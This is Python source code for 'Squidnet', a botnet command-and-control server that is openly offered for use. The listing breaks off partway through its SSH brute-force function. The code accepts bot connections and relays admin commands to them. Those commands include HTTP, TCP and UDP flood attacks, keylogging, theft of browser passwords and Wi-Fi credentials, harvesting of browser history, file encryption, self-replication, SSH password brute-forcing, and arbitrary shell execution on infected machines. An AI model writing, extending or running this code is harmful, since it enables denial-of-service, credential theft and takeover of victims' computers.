import random, socket, time, sys, threading, random, os, hashlib, datetime, sqlite3
try:
    """This Module comes with Paramiko."""
    from cryptography.fernet import Fernet
except:
    pass
from optparse import OptionParser
"""This script is NOT Perfected(Still a WIP)! Notify me if there are any 
issues with the script! I am open for DMs but please state that are a user
of my scripts, otherwise I will ignore you(I don't accept DMs from
strangers). My Discord: DrSquid™#7711. If you are unable to reach me,
you can open a discussion and I will respond to that in my repository."""

class ArguementParse:
    """Main Class for parsing command prompt arguements
    when running the scripts."""
    def __init__(self):
        """All arguements are optional! The botnet will start up without
        arguements, however it will only be hosted on localhost.
        The arguement parsing function will be utilized here."""
        self.get_args()
    def downloadNgrok(self):
        """Downloads Ngrok for windows. May need to add it for other OS's
        but maybe in the future I will."""
        print("[+] Downloading Ngrok.....\n")
        if sys.platform == "win32":
            batfile = open("getNgrok.bat", "w")
            batfile.write(f"""
curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
tar -xf {os.getcwd()}/ngrok.zip
            """)
            batfile.close()
            os.startfile(batfile.name)
        else:
            output = os.popen("curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip")
        print("[+] Downloading Ngrok.....")
        print("[+] Ngrok zip file has been downloaded. Unzip it to extract ngrok!\n")
        print("[+] Sign in with an ngrok account and you are good to go.")
        print("[+] Run 'ngrok tcp 80' to start an Ngrok domain after finishing.")
        sys.exit()
    def usage(self):
        """Displays help for arguement parsing(good for first time users).
        Allows the user to know what the arguements do as well as well as
        how to use them."""
        print(Botnet.log_logo(None))
        print("""
[+] Option-Parsing Help:
[+] --ip, --ipaddr        - Specifies the IP to host the Botnet on.
[+] --p,  --port          - Specifies the Port to host the Botnet on.
[+] --aU, --adminuser     - Specify Botnet Admin Username.
[+] --aP, --adminpass     - Specify Botnet Admin Password.
[+] --pL, --passlist      - Specify a TXT File for SSH Brute-Forcing.

[+] Optional Arguements:
[+] --i,  --info          - Shows this message.
[+] --gN, --getngrok      - Downloads Ngrok.
[+] --eK, --encryptkey    - Specify encrypting key for bots.
[+] --eH, --externalhost  - Specify an External Hostname for external connections.
[+] --eP, --externalport  - Specify an External Port for external connections.
[+] Note: You need to have an Ngrok domain started for the ngrok arguements to have effect.

[+] Usage:""")
        if sys.argv[0].endswith(".py"):
            print("""[+] python3 Squidnet.py --ip <ip> --p <port> --aU <adminuser> --aP <adminpass> --eK <encryptkey> --pL <passlist> --nH <ngrokhost> --nP <ngrokport>
[+] python3 Squidnet.py --i
[+] python3 Squidnet.py --gN""")
        else:
            print("""[+] Squidnet --ip <ip> --p <port> --aU <adminuser> --aP <adminpass> --eK <encryptkey> --pL <passlist> --nH <ngrokhost> --nP <ngrokport>
[+] Squidnet --i
[+] Squidnet --gN""")
        sys.exit()
    def get_args(self):
        """Arguement Parsing function for initiating the Botnet. Also adds
        a bit of info for configuring settings in the Botnet to function the
        best way that it can."""
        opt = OptionParser()
        opt.add_option("--ip", "--ipaddr", dest="ip")
        opt.add_option("--p", "--port", dest="port")
        opt.add_option("--aU", "--adminuser", dest="adminuser")
        opt.add_option("--aP", "--adminpass", dest="adminpass")
        opt.add_option("--eK", "--encryptkey", dest="key")
        opt.add_option("--pL", "--passlist", dest="passfile")
        opt.add_option("--eH", "--externalhost", dest="ngrokhost")
        opt.add_option("--eP", "--externalport", dest="ngrokport")
        opt.add_option("--gN", "--getngrok", dest="download", action="store_true")
        opt.add_option("--i", "--info", dest="info", action="store_true")
        arg, opti = opt.parse_args()
        if arg.download is not None:
            print(Botnet.log_logo(None))
            self.downloadNgrok()
        if arg.info is not None:
            self.usage()
        else:
            pass
        if arg.ip is None:
            ip = "localhost"
        else:
            ip = arg.ip
        if arg.port is None:
            port = 80
        else:
            try:
                port = int(arg.port)
                if port == 8080:
                    port = 80
            except:
                Botnet.logo(None)
                print("[+] Invalid port provided! Must be an integer!")
                sys.exit()
        if arg.adminuser is None:
            adminuser = "admin"
        else:
            adminuser = arg.adminuser
        if arg.adminpass is None:
            adminpass = str(random.randint(0, 99999999999999999999999999999))
        else:
            adminpass = arg.adminpass
        if arg.key is None:
            try:
                key = Fernet.generate_key()
            except:
                key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
        else:
            key = str(arg.key).encode()
        if arg.passfile is None:
            passfile = False
        else:
            passfile = arg.passfile
        if arg.ngrokhost is not None:
            ngrokhost = arg.ngrokhost
        else:
            ngrokhost = None
        if arg.ngrokport is not None:
            try:
                ngrokport = int(arg.ngrokport)
            except:
                print(Botnet.log_logo(None))
                print("[+] Invalid port provided! Must be an integer!")
                sys.exit()
        else:
            ngrokport = None
        self.webinterface = Web_Interface("localhost", 8080)
        self.botnet = Botnet(ip, port, adminuser, adminpass, key, passfile, ngrokhost, ngrokport)
class Botnet:
    """Main Class Made for the BotNet. Everything important
    and needed for the Botnet is located in this class."""
    class NotSamePassException(Exception):
        def __init__(self, msg=f"Configured Password is the the same as one in server txt file!"):
            """Little Error for the password configuration."""
            self.msg = msg
            super().__init__(self.msg)
    def __init__(self, ip, port, name, passw, key, passwfile, ngroklink=None, ngrokport=None):
        """Initiation of the main script. Definition of socket server, ngrok hosts, logging, etc
        are created. There are also definition of variables that are vital to the overall script
        that are defined here as well. Logging is also started."""
        self.ip = ip
        self.port = int(port)
        self.name = name
        self.passw = passw
        self.key = key
        self.info = []
        self.ssh_info = []
        self.admininfo = []
        self.bot_count = 0
        self.passfilename = passwfile
        self.logfile = "servlog.txt"
        self.passfile = passwfile
        self.log("\n" + self.log_logo() + "\n")
        self.log("\n[(SERVER)]: Starting up server....")
        if self.passfile != False:
            try:
                self.passwords = open(passwfile, 'r')
            except:
                self.logo()
                print(f"[+] File '{passwfile}' is not in current directory.\n[+] Server is closing.....")
                self.log(
                    "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
            sys.exit()
        self.version = "8.0"
        self.connportlist = []
        self.conn_list = []
        self.admin_conn = []
        self.ips = []
        self.ssh_bots = []
        self.ssh_botlist = []
        self.display_bots = []
        self.admin_name = ""
        self.admin_password = ""
        self.savefile = False
        self.botfile = ""
        self.instruction = ""
        try:
            self.ngroklink = ngroklink
            self.ngrokport = int(ngrokport)
            tester = socket.gethostbyname(self.ngroklink)
        except:
            self.ngroklink = self.ip
            self.ngrokport = self.port
        self.listenforconn = True
        self.botscript = self.bot_script()
        self.working = False
        self.obtaininghistory = False
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.serv.bind((ip, port))
            self.working = True
        except Exception as e:
            self.working = False
            self.logo()
            print("[+] The Server cannot be started! Check the logs for more info.")
            self.log(f"\n[(ERROR)]: Unable to bind IP and Port due to: {e}")
            sys.exit()
        if self.working:
            self.adminconfig = threading.Thread(target=self.configure_adminfile)
            self.adminconfig.start()
            self.cwd = os.getcwd()
            self.listener = threading.Thread(target=self.listen)
            self.listener.start()
            self.logo()
            self.savefile = False
            self.displaykeys = False
            self.welcomemsg = """
[(SERVER)]: 
[+] List of Commands:
[+] !help                                - Displays this message.
[+] !getconninfo                         - Displays info about all of the connections.

[+] Commands for TCP Botnet:

[+] !httpflood [website] [delay]         - Denial Of Services the website provided.
[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.
[+] !udpflood [ip] [port] [delay] [size] - Floods the target with UDP Packets.
[+] !openfile [filename]                 - Opens a file in the bot working directory.
[+] !changedir [dir]                     - Changes the working directory of the Bot.
[+] !rmdir [folder]                      - Removes a folder in the bot working directory.
[+] !rmfile [file]                       - Removes a file in the bot working directory.
[+] !encfile [file]                      - Encrypts a provided file in the bot working directory
[+] !decfile [file]                      - Decrypts a provided file in the bot working directory
[+] !viewfilecontent [file]              - Gets the content of the files provided.
[+] !dwnldfile [src] [file]              - Downloads a file from the internet onto the bot computer.
[+] !mkdir [dir]                         - Makes a folder in the bot current directory.
[+] !gotowebsite [url]                   - Takes the bot to the provided website.
[+] !mkfile [filename]                   - Creates a file in the bot working directory.
[+] !editfile [file]                     - Opens a file in writing mode for the bots.
[+] !stopedit                            - Closes file editor on bots and returns to normal.
[+] !keylog [display?]                   - Sets up keylogging on the bots(put True in 2nd arg to display it, put nothing to not).
[+] !stopkeylog                          - Stops any keylogging on the Botnet.
[+] !encdir                              - Encrypts all files in the bot working directory
[+] !decdir                              - Decrypts all files in the bot working directory
[+] !botcount                            - Gets the amount of connected bots.
[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.
[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.
[+] !listdir                             - Lists the files in the bot working directories.
[+] !resettoken                          - Resets the token and changes it to a new token
[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.
[+] !getip                               - Gets the IP of the bots
[+] !getwifi                             - Obtains the wifi names and passwords of the bots(Windows only).
[+] !savefile                            - Obtains a file from the bots directory.
[+] !getcwd                              - Gets the bots working directory.
[+] !getos                               - Gets the OS Of the bots.
[+] !getpasswords                        - Gets the stored browser passwords of the bots(Windows only).
[+] !rickroll                            - Rick Rolls the Bots.  
[+] !getchromehistory                    - Obtains the chrome history of the bots(it needs to already be in the server txt file).   
[+] !cloneself                           - Self replicates the Bot scripts in the bots.

[+] Commands for SSH Botnet:

[+] !infect [ip] [user]                  - Brute forces login for provided ip and username.
[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password.
[+] !listsshbots                         - Lists all SSH Bots.

[+] Any other commands will be made into cmd commands.
                            """
            item = f"\n[(SERVER)]: Server started: {datetime.datetime.today()}\n[(SERVER)]: Successfully started server on: {self.ngroklink}:{self.ngrokport}\n[(SERVER)]: Listening for connections.....\n[(SERVER)]: Encryption key used: {self.key}"
            self.log(item)
            print(f"\n[+] Hosting Server at {self.ngroklink}:{self.ngrokport}")
            print("[+] Web-Interface For More Info: http://127.0.0.1:8080")
            print("[+] Botnet is Up! Listening for connections.....\n")
            print(f"[+] This Server is being logged!\n[+] Server Log File: {self.logfile}")
            print(f"\n[+] Use this token when encrypting!: {key}")
            print("[+] Notice that this token will be used if encrypting files(probably save it).")
            self.usage()
            self.instructor = threading.Thread(target=self.instruct)
            self.instructor.start()
    def log_logo(self=None):
        """Logo of this script."""
        logo = """
  _____             _     _ _   _      _            ___   ___  
 / ____|           (_)   | | \ | |    | |          / _ \ / _ \ 
| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| (_) | | | |
 \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /> _ <| | | |
 ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | |_| |
|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)___/ 
           | |                                                 
           |_|                                                                                                                     
TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
        return logo
    def logo(self):
        """Prints the logo of this script."""
        print(self.log_logo())
    def usage(self):
        """This displays the list of commands on the server that can be sent to the bots."""
        print("\n[+] Commands:\n")
        print("[+] !help                                - Displays all of the commands.")
        print("[+] !whatsnew                            - Displays all new features.")
        print("[+] !getconninfo                         - Displays info about all of the connections.")
        print(
            "[+] !genadminscript                      - Generates the admin script for remote connections to this server.")
        print(
            "[+] !genscript                           - Generates the bot python script needed to connect to this server.")
        print("[+] !clear                               - Clears the output.")
        print(
            "[+] !togglelisten                        - Toggles whether to stop accepting connections or start accepting them.")
        print("[+] !kick [hostname] [srcport]           - Kicks a client off of the Botnet.")
        print("\n[+] Commands for TCP Botnet:\n")
        print("[+] !httpflood [website] [delay]         - Denial Of Services the website provided.")
        print("[+] !tcpflood [ip] [port] [delay] [size] - Floods the target with TCP Packets.")
        print("[+] !udpflood [ip] [port] [delay] [size] - Floods the target with UDP Packets.")
        print("[+] !openfile [filename]                 - Opens a file in the bot working directory.")
        print("[+] !changedir [dir]                     - Changes the working directory of the Bot.")
        print("[+] !rmdir [folder]                      - Removes a folder in the bot working directory.")
        print("[+] !rmfile [file]                       - Removes a file in the bot working directory.")
        print("[+] !encfile [file]                      - Encrypts a provided file in the bot working directory")
        print("[+] !decfile [file]                      - Decrypts a provided file in the bot working directory")
        print("[+] !viewfilecontent [file]              - Gets the content of the files provided.")
        print("[+] !dwnldfile [src] [file]              - Downloads a file from the internet onto the bot computer.")
        print("[+] !mkdir [dir]                         - Makes a folder in the bot current directory.")
        print("[+] !gotowebsite [url]                   - Takes the bot to the provided website.")
        print("[+] !mkfile [filename]                   - Creates a file in the bot working directory.")
        print("[+] !editfile [file]                     - Opens a file in writing mode for the bots.")
        print("[+] !stopedit                            - Closes file editor on bots and returns to normal.")
        print(
            "[+] !keylog [display?]                   - Sets up keylogging on the bots(put True in 2nd arg to display it, put nothing to not).")
        print("[+] !stopkeylog                          - Stops any keylogging on the Botnet.")
        print("[+] !encdir                              - Encrypts all files in the bot working directory")
        print("[+] !decdir                              - Decrypts all files in the bot working directory")
        print("[+] !botcount                            - Gets the amount of connected bots.")
        print("[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.")
        print("[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.")
        print("[+] !listdir                             - Lists the files in the bot working directories.")
        print("[+] !resettoken                          - Resets the token and changes it to a new token")
        print("[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.")
        print("[+] !getip                               - Gets the IP of the bots")
        print(
            "[+] !getwifi                             - Obtains the wifi names and passwords of the bots(Windows only).")
        print("[+] !savefile                            - Obtains a file from the bots directory.")
        print("[+] !getcwd                              - Gets the bots working directory.")
        print("[+] !getos                               - Gets the OS Of the bots.")
        print("[+] !getpasswords                        - Gets the stored browser passwords of the bots(Windows only).")
        print("[+] !rickroll                            - Rick Rolls the Bots.")
        print("[+] !cloneself                           - Self replicates the Bot scripts in the bots.")
        print(
            "[+] !getchromehistory                    - Check the bots chrome history(Hehehe....)(it will save in an external file).")
        print("\n[+] Commands for SSH Botnet:\n")
        print("[+] !infect [ip] [user]                  - Brute forces login for the provided ip and username.")
        print("[+] !inject [file]                       - Opens FTP and injects a file into an infected host.")
        print("[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password.")
        print("[+] !listsshbots                         - Lists all SSH Bots.")
        print("\n[+] Any other commands will be made into cmd commands.\n")
    def configure_adminfile(self):
        """Creates a file with the admin username and the password.
        The password will be hashed and put into the file, where
        it will be referred to if an admin tries to log into the server."""
        try:
            admin_file = open('admin.txt', 'r')
            username_password = admin_file.read()
            username_password = username_password.split()
            self.admin_name = username_password[0]
            self.admin_password = username_password[1]
            if hashlib.sha256(self.admin_password.encode()).hexdigest() != hashlib.sha256(
                    self.passw.encode()).hexdigest() or self.admin_name != self.name:
                raise self.NotSamePassException
            admin_file.close()
        except:
            admin_file = open('admin.txt', 'w')
            self.admin_name = self.name
            self.admin_password = hashlib.sha256(self.passw.encode()).hexdigest()
            admin_contents = f"{self.name} {self.admin_password}"
            admin_file.write(admin_contents)
        try:
            with open('token.txt', 'r') as tokenfile:
                key = tokenfile.read()
                tokenfile.close()
        except:
            with open('token.txt', 'w') as tokenfile:
                key = self.key
                tokenfile.write(str(key))
                tokenfile.close()
    def listen(self):
        """This function listens for connections from admins and bots alike.
        The first message recieved will be interpreted as the name of the device
        and it will displayed for the Admins to see. A thread is created for the
        handling of the connection. If variable 'self.listenforconn' is False, then
        the server will not listen for connections."""
        while True:
            try:
                if self.listenforconn:
                    flag = 0
                    self.serv.listen(1)
                    c, ip = self.serv.accept()
                    if not self.listenforconn:
                        c.close()
                    else:
                        msg = c.recv(1024).decode().strip()
                        self.bot_count += 1
                        split_msg = msg.split()
                        hostname = split_msg[0]
                        try:
                            ipaddr = str(split_msg[1])
                        except:
                            ipaddr = "Unknown"
                        try:
                            user = str(split_msg[2])
                        except:
                            user = "Unknown"
                        try:
                            connection = str(ip[1])
                        except:
                            connection = "Unknown"
                        try:
                            opsys = split_msg[3]
                        except:
                            opsys = "Unknown"
                        self.connportlist.append(hostname + " " + str(ip[1]) + " " + str(c))
                        self.log(f"""
[({hostname})---->(SERVER)]:
[+] HOSTNAME: {hostname}
[+] IPADDR  : {ipaddr}
[+] USERNAME: {user}
[+] CONN    : {connection}
[+] OS      : {opsys}
                                                            """)
                        info = str(hostname + " " + ipaddr + " " + user + " " + connection + " " + opsys)
                        self.info.append(info)
                        print(f"\n[!] {hostname} has connected to the botnet.")
                        self.log(f"\n[(CONNECTION)]: {hostname} has connected to the botnet.")
                        handle = threading.Thread(target=self.handler, args=(c, hostname, self.bot_count, info))
                        handle.start()
                else:
                    pass
            except Exception as e:
                self.log(f"\n[(ERROR)]: {str(e)}")
    def log(self, msg):
        """Logs server output."""
        try:
            self.serverlog = open(self.logfile, 'r')
            contents = self.serverlog.read()
            self.serverlog.close()
            self.serverlog = open(self.logfile, 'w')
            self.serverlog.write(contents)
            self.serverlog.write(msg)
            self.serverlog.close()
        except FileNotFoundError:
            self.serverlog = open(self.logfile, "w")
            self.serverlog.write(msg)
            self.serverlog.close()
        except:
            self.serverlog = open(self.logfile, 'rb')
            contents = self.serverlog.read()
            self.serverlog.close()
            self.serverlog = open(self.logfile, 'wb')
            self.serverlog.write(contents)
            self.serverlog.write(msg)
            self.serverlog.close()
    def wrap_item(self, word, size):
        """Wraps the items from the conn-list and aligns it in the table."""
        item = word
        while len(item) + 2 <= size - 1:
            item += " "
        return item
    def gen_conntable(self):
        """Generates the connection table with info about each connection.
        This is similar to the information displayed in the Web-Interface."""
        result = """
Regular Connections:
______________________________________________________________________________________
|                       |                  |              |              |           |
|       Hostname        |    IP Address    |   Username   |  Connection  |    OS     |
|_______________________|__________________|______________|______________|___________|"""
        for info in self.info:
            split_info = info.split()
            result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}| {self.wrap_item(split_info[3], 15)}| {self.wrap_item(split_info[4], 12)}|"
        result += "\n|_______________________|__________________|______________|______________|___________|"
        result += """

Admin Connections:
______________________________________________________________________________________
|                       |                  |              |              |           |
|       Hostname        |    IP Address    |   Username   |  Connection  |    OS     |
|_______________________|__________________|______________|______________|___________|"""
        for info in self.admininfo:
            split_info = info.split()
            result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}| {self.wrap_item(split_info[3], 15)}| {self.wrap_item(split_info[4], 12)}|"
        result += "\n|_______________________|__________________|______________|______________|___________|"
        result += """

SSH Connections:
________________________________________________________
|                       |               |              |
|       Hostname        |  IP Address   |   Password   |
|_______________________|_______________|______________|"""
        for info in self.ssh_info:
            split_info = info.split()
            result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}|"
        result += "\n|_______________________|_______________|______________|\n"
        return result
    def handler(self, c, hostname, number, info):
        """Function recieves packets from the connections. This is needed for clients
        to send packets to the botnet so the Admin can see what the Bots are sending.
        This is needed also for password grabbing and information obtaining. This
        function is also important for admin connections as they need to send and
        recieve packets. It also handles the connections, and keeps them alive."""
        admin = False
        isbot = False
        while True:
            try:
                msg = c.recv(65500)
                if self.savefile or self.obtaininghistory:
                    pass
                else:
                    try:
                        msg = msg.decode()
                    except Exception as e:
                        msg = str(msg)
                        self.log(f"\n[(ERROR)]: {str(e)}")
                if not isbot:
                    if msg == "!CLIENTLOG":
                        isbot = True
                        msgtoadmin = f"[(SERVER)]: {hostname} is recognized as part of the Botnet."
                        self.log("\n" + msgtoadmin)
                        print(f"[!] {hostname} is recognized as part of the Botnet.")
                        for adm in self.admin_conn:
                            try:
                                adm.send(msgtoadmin.encode())
                            except Exception as e:
                                self.log(f"\n[(ERROR)]: {str(e)}")
                        self.conn_list.append(c)
                    else:
                        print(f"[!] WARNING: {hostname} IS NOT PART OF THE BOTNET.\n[!] Closing Connection.....")
                        c.close()
                        break
                if isbot:
                    if not admin:
                        if str(type(msg)) == "str":
                            if msg.startswith('!login'):
                                msg_split = msg.split()
                                name = msg_split[1]
                                passw = msg_split[2]
                                try:
                                    passw = passw.encode()
                                except Exception as e:
                                    self.log(f"\n[(ERROR)]: {str(e)}")
                                hashed_passw = hashlib.sha256(passw).hexdigest()
                                if hashed_passw == self.admin_password and name == self.admin_name:
                                    try:
                                        admin = True
                                        print(f"[!] {hostname} is an Admin!")
                                        hostname = f"ADMIN)({hostname}"
                                        msgtoadmin = f"[(SERVER)]: {hostname} is an Admin!"
                                        self.log("\n" + msgtoadmin)
                                        for admi in self.admin_conn:
                                            try:
                                                admi.send(msgtoadmin.encode())
                                            except Exception as e:
                                                self.log(f"\n[(ERROR)]: {str(e)}")
                                        self.admin_conn.append(c)
                                        try:
                                            c.send(self.welcomemsg.encode())
                                        except:
                                            pass
                                        self.log(f"\n[(SERVER)---->({hostname})]: Sent welcome message.")
                                        self.admininfo.append(info)
                                    except:
                                        pass
                                else:
                                    c.send("Access Denied!".encode())
                                    msgtoall = f"[(ATTEMPTEDBREACHWARNING)]: {hostname} attempted to login to the botnet with incorrect credentials!\n[(ATTEMPTEDBREACHWARNING)]: Closing Connection...."
                                    self.log("\n" + msgtoall)
                                    print(msgtoall)
                                    for admins in self.admin_conn:
                                        try:
                                            admins.send(msgtoall.encode())
                                        except Exception as e:
                                            self.log(f"\n[(ERROR)]: {str(e)}")
                                    c.close()
                                    break
                            elif msg.startswith("!sendkey"):
                                msg_split = msg.split()
                                del msg_split[0]
                                main_msg = ""
                                for i in msg_split:
                                    main_msg = main_msg + " " + i
                                main_msg = main_msg.strip()
                                logthis = f"[({hostname})]: {main_msg}"
                                if self.displaykeys:
                                    print(logthis)
                        if self.obtaininghistory:
                            try:
                                if msg.decode().strip() == "":
                                    pass
                                else:
                                    self.historyfile.write(f"\n[({hostname})]: ".encode() + msg)
                            except:
                                self.historyfile.write(f"\n[({hostname})]: ".encode() + msg)
                    if admin:
                        if msg.startswith('!httpflood'):
                            msgtobot = msg.split()
                            try:
                                targ_website = msgtobot[1]
                                atk_delay = msgtobot[2]
                                servmsg = f"[({hostname})]: Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.\n"
                                self.log("\n" + servmsg)
                                print(servmsg)
                                c.send(
                                    f"Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Successfully started an HTTP Flood Attack on {targ_website} wth a delay of {atk_delay}")
                            except:
                                msg = "help"
                                c.send("Invalid Parameters!".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
                        elif msg.startswith('!tcpflood'):
                            msgtobot = msg.split()
                            try:
                                target = msgtobot[1]
                                servmsg = f"[({hostname})]: Beginning TCP Flood Attack on {target}.\n"
                                self.log("\n" + servmsg)
                                print(servmsg)
                                c.send(
                                    f"Successfully started a TCP Flood Attack on {target}".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Successfully started a TCP Flood Attack on {target}")
                            except:
                                msg = "help"
                                c.send("Invalid Parameters!".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
                        elif msg.startswith("!getchromehistory"):
                            try:
                                file = open("BotsHistory.txt", "rb").read()
                                if len(str(file)) == 0:
                                    c.send(
                                        "[(SERVER)]: Unable to send Bots history from the bots(Needs to be obtained on the server-side).".encode())
                                else:
                                    c.send("[(SERVER)]:".encode() + file)
                            except:
                                c.send(
                                    "[(SERVER)]: Unable to send Bots history from the bots(Needs to be obtained on the server-side).".encode())
                        elif msg.startswith('!udpflood'):
                            msgtobot = msg.split()
                            try:
                                target = msgtobot[1]
                                servmsg = f"[({hostname})]: Beginning UDP Flood Attack on {target}.\n"
                                self.log("\n" + servmsg)
                                print(servmsg)
                                c.send(
                                    f"Successfully started a UDP Flood Attack on {target}".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Successfully started a UDP Flood Attack on {target}")
                            except:
                                msg = "help"
                                c.send("Invalid Parameters!".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
                        elif msg.startswith('!help'):
                            c.send(self.welcomemsg.encode())
                        elif msg.startswith("!infect"):
                            if self.passfile != False:
                                msg_split = msg.split()
                                ip = msg_split[1]
                                username = msg_split[2]
                                bruteforcer = threading.Thread(target=self.ssh_infect, args=(ip, username))
                                bruteforcer.start()
                            else:
                                c.send(
                                    "[(SERVER)]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!".encode())
                                self.log(
                                    f"\n[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
                        elif msg.startswith("!keylog"):
                            msg_split = msg.split()
                            try:
                                self.displaykeys = bool(msg_split[1])
                            except:
                                self.displaykeys = False
                            self.log("\n[(SERVER)]: Started Keylogging on the bots.")
                            c.send(
                                f"[(SERVER)]: Set displaying Key-inputs to the server to: {self.displaykeys}".encode())
                        elif msg.startswith("!stopkeylog"):
                            self.log("\n[(SERVER)]: Stopped Keylogging on the bots.")
                        elif msg.startswith("!sshlogin"):
                            msg_split = msg.split()
                            ip = msg_split[1]
                            username = msg_split[2]
                            password = msg_split[3]
                            login = threading.Thread(target=self.ssh_login, args=(ip, username, password))
                            login.start()
                        elif msg.startswith("!getconninfo"):
                            c.send(str("[(SERVER)]:\n" + self.gen_conntable()).encode())
                            self.log(f"\n[(SERVER)---->({hostname})]:\n{self.gen_conntable()}")
                        elif msg.startswith("!inject"):
                            msg_split = msg.split()
                            file = msg_split[1]
                            for bot in self.ssh_bots:
                                self.ssh_inject(bot, file)
                        elif msg.startswith("!listsshbots"):
                            c.send(f"[(SERVER)]: Connected SSH Bots: {self.display_bots}".encode())
                            self.log(f"\n[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
                        if "!login" in msg.strip() or "!help" in msg.strip() or "!getconninfo" in msg.strip() or "!listsshbots" in msg.strip() or "!getchromehistory" in msg.strip() or self.obtaininghistory:
                            pass
                        else:
                            if len(self.ssh_bots) != 0:
                                sendtossh = threading.Thread(target=self.send_ssh, args=(msg,))
                                sendtossh.start()
                            for connect in self.conn_list:
                                if connect in self.admin_conn:
                                    pass
                                else:
                                    try:
                                        connect.send(msg.encode())
                                    except:
                                        connect.send(msg)
                if msg == "" or msg == " ":
                    pass
                else:
                    if self.savefile:
                        try:
                            if msg.decode() == "finished":
                                savefile = False
                        except:
                            pass
                        filenames = f"{number}{self.botfile}"
                        file_created = False
                        try:
                            file = open(filenames, 'rb')
                            file_content = file.read()
                            file_created = True
                        except:
                            file = open(filenames, 'wb')
                            file.write(msg)
                            file_content = msg
                            file.close()
                            file_created = True
                        if file_created:
                            file = open(filenames, 'wb')
                            try:
                                file.write(file_content.encode())
                            except:
                                file.write(file_content)
                            try:
                                file.write(msg.encode())
                            except:
                                file.write(msg)
                            file.close()
                            filemsg = f"\n[({hostname})]: Saved contents of {self.botfile} into {filenames}"
                            print(filemsg)
                            self.log(filemsg)
                            file_created = False
                    elif not self.savefile:
                        try:
                            if not self.obtaininghistory:
                                msgtoadmin = f"[({hostname})]: {msg.strip()}"
                                self.log("\n" + msgtoadmin)
                                if not msg.startswith("!sendkey"):
                                    print("\n" + msgtoadmin)
                        except Exception as e:
                            self.log(f"\n[(ERROR)]: {e}")
                        for adminconn in self.admin_conn:
                            try:
                                if c == adminconn:
                                    pass
                                else:
                                    adminconn.send(msgtoadmin.encode())
                            except Exception as e:
                                self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
            except Exception as e:
                if "a bytes-like object is required, not 'str'" in str(
                        e) or "An operation was attempted on something that is not a socket" in str(
                        e) or "startswith first arg must be bytes or a tuple of bytes, not str" in str(e):
                    self.log(f"\n[(ERROR)]: Ignoring Error {e} in {hostname}")
                else:
                    self.log(
                        f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
                    print(f"\n[!] {hostname} seems defective.\n[!] Closing connection....\n")
                    c.close()
                    break
    def ssh_login(self, ip, username, password):
        """Does regular logging in with SSH into the provided ip and username. There is no
        brute-forcing since a password arguement has be passed, and that the brute-force text
        file is not used."""
        print(f"[+] Attempting to login to {username}@{ip}\n[+] With password: {password}")
        msgtoadmin = f"[(SERVER)]: Attempting to login to {username}@{ip}\n[(SERVER)]: With password: {password}"
        self.log('\n' + msgtoadmin)
        for admin in self.admin_conn:
            try:
                admin.send(msgtoadmin.encode())
            except:
                pass
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, 22, username, password)
            self.ips.append(ip)
            self.display_bots.append(f"{username}@{ip}")
            self.ssh_bots.append(client)
            self.ssh_info.append(str(username) + " " + str(ip) + " " + str(password))
            self.ssh_botlist.append(str(client) + ' ' + str(username))
            msgtoadmin = f"[(SERVER)]: {ip}'s Password has been found!: {password}\n[(SERVER)] Adding {username}@{ip} to the botnet.\n"
            self.log('\n' + msgtoadmin)
            for admin in self.admin_conn:
                try:
                    admin.send(msgtoadmin.encode())
                except:
                    pass
            print(
                f"\n[!] Successfully logged into {username}@{ip} with {password}!\n[!] Adding {username}@{ip} to the botnet.\n")
        except Exception as e:
            print(f"[+] Unable to login to {ip}@{username}\n[+] Try using different credentials.")
            msgtoadmin = f"[(SERVER)]: Unable to log into {username}@{ip} due to: {e}"
            self.log("\n" + msgtoadmin)
            for admin in self.admin_conn:
                try:
                    admin.send(msgtoadmin.encode())
                except:
                    pass
    def ssh_infect(self, ip, username):
        """Attempts to brute force the ip and username with the password list provided
        from the txt file specified in the __init__ function."""
        print(f"[+] Brute Forcing the Password for: {username}@{ip}\n")
